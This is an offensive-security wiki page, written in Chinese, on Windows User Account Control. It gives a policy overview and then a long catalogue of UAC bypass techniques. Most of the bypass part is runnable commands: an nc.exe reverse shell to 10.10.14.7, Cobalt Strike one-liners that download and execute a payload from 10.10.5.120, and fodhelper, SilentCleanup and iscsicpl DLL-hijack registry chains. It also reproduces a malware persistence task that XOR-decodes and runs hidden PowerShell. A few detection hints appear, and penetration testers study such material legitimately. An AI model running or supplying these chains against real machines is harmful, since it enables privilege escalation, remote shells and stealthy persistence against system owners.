# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项用于对**提升权限的活动显示同意提示**的功能。应用程序具有不同的 `integrity` 级别，而具有**高等级**的程序可以执行**可能危及系统安全**的任务。启用 UAC 后，除非管理员明确授权这些应用程序/任务以管理员级别的系统访问权限运行，否则应用程序和任务始终**在非管理员账户的安全上下文中运行**。这是一项可防止管理员进行非预期更改的便利功能，但不被视为安全边界。<sup>[[2]](#references)</sup>

有关 integrity levels 的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

启用 UAC 后，管理员用户会获得 2 个令牌：一个用于以 medium integrity 执行常规操作的标准用户令牌，以及一个包含管理员权限的令牌。

此[页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)深入介绍了 UAC 的工作方式，包括 logon 过程、用户体验和 UAC 架构。<sup>[[2]](#references)</sup>管理员可以使用安全策略，在本地配置 UAC 针对其组织的工作方式（使用 secpol.msc），也可以在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置并推送。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)有详细说明。UAC 有 10 项可设置的 Group Policy 设置。下表提供了更多详细信息：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 内置 Administrator 账户的 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode 中管理员的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: 标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: 检测应用程序安装并提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: 仅提升已签名和已验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: 仅提升安装在安全位置的 UIAccess 应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: 以 Admin Approval Mode 运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: 允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: 提示提升权限时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: 将文件和注册表写入失败虚拟化到每用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows 上安装软件的策略

**local security policies**（大多数系统上的 "secpol.msc"）默认配置为**阻止非管理员用户执行软件安装**。这意味着，即使非管理员用户可以下载软件的安装程序，也无法在没有管理员账户的情况下运行它。

### 强制 UAC 请求提升权限的 Registry Keys

作为没有管理员权限的标准用户，你可以确保当“标准”账户尝试执行某些操作时，UAC 会**提示输入凭据**。此操作需要修改某些 **registry keys**，而修改这些键需要管理员权限，除非存在 **UAC bypass**，或者攻击者已经以管理员身份登录。

即使用户属于 **Administrators** 组，这些更改也会强制用户**重新输入其账户凭据**，才能执行管理操作。

**在实践中，只有在你已经拥有 elevated token、UAC bypass，或存在允许你修改这些键的错误配置时，这才有用；否则，registry write 本身就会被阻止。**

必须修改以下 registry keys 和条目（括号内为其默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

也可以通过 Local Security Policy 工具手动完成。更改后，管理操作会提示用户重新输入其凭据。

### 注意

**User Account Control 不是安全边界。**因此，标准用户无法脱离其账户并获得管理员权限，除非利用 local privilege escalation 漏洞。

### 向用户请求“完整的计算机访问权限”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode 使用完整性检查，防止高完整性级别进程（如 Web 浏览器）访问低完整性级别数据（如临时 Internet 文件夹）。这是通过使用低完整性令牌运行浏览器来实现的。当浏览器尝试访问存储在低完整性区域中的数据时，操作系统会检查进程的完整性级别，并据此允许访问。此功能有助于防止远程代码执行攻击访问系统上的敏感数据。
- 用户登录 Windows 时，系统会创建一个访问令牌，其中包含用户权限列表。权限定义为用户权利和能力的组合。该令牌还包含用户凭据列表，这些凭据用于向计算机和网络资源验证用户身份。

### Autoadminlogon

要将 Windows 配置为在启动时自动登录指定用户，请设置 **`AutoAdminLogon` 注册表项**。这对 kiosk 环境或测试用途很有用。仅在安全系统上使用此功能，因为它会将密码暴露在注册表中。

使用 Registry Editor 或 `reg add` 设置以下项：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`：
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

要恢复正常登录行为，请将 `AutoAdminLogon` 设置为 0。

## UAC bypass

> [!TIP]
> 请注意，如果你可以对受害者主机进行图形化访问，那么 UAC bypass 很直接，因为 UAC 提示出现时只需点击“Yes”

在以下情况下需要进行 UAC bypass：**UAC 已启用、你的进程运行在中完整性上下文中，并且你的用户属于 administrators 组**。

需要特别说明的是，如果 UAC 处于最高安全级别（Always），其 bypass 难度会**远高于**处于其他级别（Default）时。

### 来自中完整性 shell 的快速 triage

在尝试 bypass 之前，确认你处于正确的场景中，并将主机版本映射到已知可用的方法：
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
实用说明：
- 如果 `EnableLUA=0`，则不需要 bypass：任何 admin token 都可以直接请求 high integrity。
- `ConsentPromptBehaviorAdmin=2` 或 `5` 是 auto-elevate / 基于 COM 的 bypasses 的常见场景。
- `Always Notify` 会提高门槛，但你仍应测试确切的 build，而不是假设会失败：UACME 仍在现代 Windows build 上跟踪一些与 `AlwaysNotify compatible` 的方法。<sup>[[3]](#references)</sup>

### UAC 已禁用

如果 UAC 已经被禁用（`ConsentPromptBehaviorAdmin` 为 **`0`），你可以使用类似以下方式，以 admin privileges（high integrity level）执行 **reverse shell**：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常**基础的 UAC“bypass”（完整文件系统访问权限）

如果你拥有一个属于 Administrators 组中用户的 shell，就可以通过 SMB 将本地共享的 **C$** **mount** 到新磁盘中，这样你将能够**访问文件系统中的所有内容**（甚至包括 Administrator 的主文件夹）。

> [!WARNING]
> **看起来这个技巧已经不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 Cobalt Strike 的 UAC bypass

Cobalt Strike techniques 仅在 UAC 未设置为最高安全级别时有效
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有多个用于 **bypass** **UAC** 的模块。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

在现代版本中，自动提升权限的 COM 对象仍然是一个实用的 UAC 攻击面。UACME 仍将 `ICMLuaUtil` 记录为可在当前 Windows 分支上工作的接口，而 offensive tooling 也在持续改进 `CMSTPLUA`，通过结合交互式桌面进程、64 位执行，以及有时进行 PEB/进程伪装，然后调用 COM Elevation Moniker。<sup>[[3]](#references)</sup>

实用技巧：
- 优先使用位于用户 **interactive session** 中的 **64-bit** 进程（通常是 `explorer.exe` 或其子进程）。
- 如果原始 shell 失败，请改用 BOF / UACME 实现重试，而不是使用简单的 `CreateProcess` wrapper。
- 预计子进程将在**单独的 elevated process** 中执行；许多 BOF 不会原地提升当前 beacon。

### KRBUACBypass

文档和工具位于 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) 是多个 UAC bypass exploits 的**汇编**。请注意，你需要使用 **Visual Studio 或 msbuild** **compile UACME**。编译过程会创建多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要了解**自己需要哪一个。**\
你应该**小心**，因为某些 bypass 会**提示其他程序**，这些程序会**提醒** **user** 当前正在发生某些操作。<sup>[[3]](#references)</sup>

UACME 标明了每项 technique 开始工作的 **build version**。<sup>[[3]](#references)</sup> 你可以搜索影响你所使用版本的 technique：
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
此外，使用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)可以根据构建版本获取 Windows release `1607`。

一个实用的工作流程是先**评估主机版本**，然后再执行匹配的方法：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` 可快速将本地构建版本与其已知的 UAC 方法进行比较，这有助于迅速排除失效的 PoC。<sup>[[4]](#references)</sup>
- `UACME` 仍然是将 bypass 映射到精确构建版本的最佳公开目录。近期版本新增了方法，并针对 **Windows 11 25H2** 重新测试了现有方法，因此在假设旧博客文章仍可直接适用之前，请重新检查 README/release notes。<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动时，它会查询下面的每用户注册表路径，但不会验证 `DelegateExecute` verb。在该位置植入命令，可以让 Medium Integrity 进程（用户属于 Administrators）在不触发 UAC 提示的情况下生成 High Integrity 进程。

fodhelper 查询的注册表路径：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 步骤（设置你的 payload，然后 trigger）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意：
- 当当前用户是 Administrators 的成员且 UAC 级别为默认/宽松时有效（不是带有额外限制的 Always Notify）。
- 使用 `sysnative` 路径从 32 位进程在 64 位 Windows 上启动 64 位 PowerShell。
- Payload 可以是任意命令（PowerShell、cmd 或 EXE 路径）。为保持 stealth，应避免弹出 UI。

#### CurVer/extension hijack variant（仅 HKCU）

近期滥用 `fodhelper.exe` 的样本会避开 `DelegateExecute`，转而通过每用户的 `CurVer` 值**重定向 `ms-settings` ProgID**。该自动提权二进制仍会在 `HKCU` 下解析处理程序，因此无需 admin token 即可植入这些键：<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
提权后，malware 通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设置为 `0` 来**禁用后续提示**，随后执行额外的 defense evasion（例如 `Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建 persistence，以高完整性运行。典型的 persistence task 会将 **XOR-encrypted PowerShell script** 存储在磁盘上，并每小时在内存中解码并执行：<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
此变体仍会清理 dropper，仅留下 staged payload，因此检测依赖于监控 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` tampering、Defender exclusion creation，或在内存中解密 PowerShell 的 scheduled tasks。<sup>[[5]](#references)</sup>

### 通过 `SilentCleanup` task 进行 UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` 会以最高权限启动 `cleanmgr.exe`，并从用户环境中展开 `%windir%`。如果你控制了 `HKCU\Environment\windir`，就可以将该展开过程重定向到任意 command，从而在不显示 consent dialog 的情况下获得 high integrity。<sup>[[8]](#references)</sup> 在最新 build 上仍值得测试此方法，因为 UACME 仍保持该 technique 启用，而近期 issue tracking 显示，Windows 11 24H2 可能只需要进行少量 quoting 调整。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
如果该版本会在路径两端加上引号，请将 payload 改为以引号结尾后重试（例如 `cmd.exe"`）。测试完成后务必清理 `HKCU\Environment\windir`。

#### More UAC bypass

许多利用 UI 流程、COM 对象或桌面交互的经典 UAC bypass 都要求受害者拥有**完整的交互式会话**；普通的 `nc.exe` shell 或运行在 **Session 0** 中的服务通常不够。

通常可以使用 **meterpreter** session 解决这一问题。迁移到 **Session** 值等于 **1** 的 **process**：

![将 ms-settings 指向自定义扩展名（.thm），并将该扩展名映射到我们的 payload - More UAC bypass：你可以通过 meterpreter session 获取。迁移到 Session...](<../../images/image (863).png>)

(_explorer.exe_ 应该可以工作)

### 使用 GUI 进行 UAC Bypass

如果你可以访问 **GUI**，那么 UAC 提示出现时直接接受即可；实际上并不需要技术性的 bypass。因此，获取 GUI session 通常就足以绕过 UAC 带来的实际阻碍。

此外，如果你获取的是某人正在使用的 GUI session（可能通过 RDP），其中可能已经有**一些工具以 administrator 身份运行**。你可以从这些工具中直接以 **admin** 身份**运行**例如 **cmd**，而不会再次触发 UAC 提示，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这种方式可能更加**隐蔽**。

### 吵闹的暴力 UAC bypass

如果你不在意产生噪声，可以直接**运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，该工具会**持续请求提升权限，直到用户接受**。

### 自定义 bypass - Basic UAC bypass methodology

查看 **UACME** 后你会发现，**许多 UAC bypass 都利用 DLL hijacking**（通常是让一个 elevated binary 从可写路径加载攻击者控制的 DLL）。[阅读此处，了解如何查找 DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 查找一个会**自动提升权限**的 binary（确认执行它时会以 high integrity level 运行）。
2. 使用 procmon 查找可能存在 **DLL Hijacking** 风险的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL **写入**某些**受保护路径**（例如 C:\Windows\System32），但你没有写入权限。可以使用以下方式绕过：
1. **wusa.exe**：适用于 Windows 7、8 和 8.1。它可以将 CAB 文件的内容解压到受保护路径中（因为该工具以 high integrity level 执行）。
2. **IFileOperation**：适用于 Windows 10。
4. 准备一个**脚本**，将 DLL 复制到受保护路径中，然后执行存在漏洞且会自动提升权限的 binary。

### Another UAC bypass technique

其原理是监视 **autoElevated binary** 是否尝试从**注册表**中读取要执行的 **binary** 或 **command** 的**名称/路径**（如果该 binary 在 **HKCU** 中搜索这些信息，则更值得关注）。

### 通过 `SysWOW64\iscsicpl.exe` + 用户 `PATH` DLL hijack 进行 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个**自动提升权限**的 binary，可以通过搜索顺序劫持加载 `iscsiexe.dll`。如果你能将恶意 `iscsiexe.dll` 放入**用户可写**文件夹，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`），使 Windows 搜索该文件夹，那么 Windows 可能会在提升权限的 `iscsicpl.exe` process 中加载攻击者的 DLL，且**不会显示 UAC 提示**。<sup>[[1]](#references)[[6]](#references)</sup>

实践注意事项：
- 当当前用户属于 **Administrators**，但由于 UAC 以 **Medium Integrity** 运行时，此方法很有用。
- **SysWOW64** 副本是此 bypass 所使用的目标。将 **System32** 副本视为独立 binary，并单独验证其行为。
- 该原语结合了**自动提升权限**和 **DLL search-order hijacking**，因此可以使用其他 UAC bypass 中相同的 ProcMon 工作流，来验证缺失 DLL 的加载。

最小流程：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
检测思路：
- 监控 `reg add` / 写入注册表 `HKCU\Environment\Path`，并紧接着执行 `C:\Windows\SysWOW64\iscsicpl.exe` 的行为。
- 搜索位于 **用户可控** 位置（例如 `%TEMP%` 或 `%LOCALAPPDATA%\Microsoft\WindowsApps`）中的 `iscsiexe.dll`。
- 将 `iscsicpl.exe` 的启动与异常子进程，或从正常 Windows 目录之外加载的 DLL 进行关联分析。

### 值得单独检查的更新研究

一些 2024 年之后的 chain 已不再表现为经典的 `HKCU\Software\Classes` 注册表劫持。例如，activation-context cache poisoning 可以结合 **drive remap** 和 **DLL redirection**，通过 `ctfmon.exe` 等受信任的 UI / auto-elevated binaries，以及后续的 `fodhelper.exe` 等目标，将权限从 medium integrity 提升到 high integrity。这里不重复放置大型 PoC，请检查以下位置中的精简 payload 示例：

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) 通过 per-logon-session DOS device map 进行 drive-letter hijack

有关 Windows 11 25H2 上完整的 `RAiLaunchAdminProcess` / UIAccess attack surface，请查看专门页面：

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 的 “Administrator Protection” 使用带有 per-session `\Sessions\0\DosDevices/<LUID>` maps 的 shadow-admin tokens。该 directory 会在首次解析 `\??` 时由 `SeGetTokenDeviceMap` 延迟创建。如果攻击者仅在 **SecurityIdentification** 级别 impersonate shadow-admin token，则该 directory 会以攻击者作为 **owner** 创建（继承 `CREATOR OWNER`），从而允许创建优先于 `\GLOBAL??` 的 drive-letter links。<sup>[[7]](#references)</sup>

**步骤：**

1. 在低权限 session 中调用 `RAiProcessRunOnce`，启动无 prompt 的 shadow-admin `runonce.exe`。
2. 将其 primary token 复制为 **identification** token，并在打开 `\??` 时 impersonate 该 token，以强制在攻击者 ownership 下创建 `\Sessions\0\DosDevices/<LUID>`。
3. 在其中创建一个指向攻击者控制存储位置的 `C:` symlink；随后该 session 中的 filesystem accesses 会将 `C:` 解析为攻击者路径，从而在无需 prompt 的情况下实现 DLL/file hijack。

**PowerShell PoC (NtObjectManager)：**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考资料

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – 用户帐户控制的工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass 技术集合](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass 兼容性扫描器和启动器](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI 采用 AI 生成 PowerShell backdoor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos：针对东南亚政府目标的 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – 使用 SilentCleanup Task bypass UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
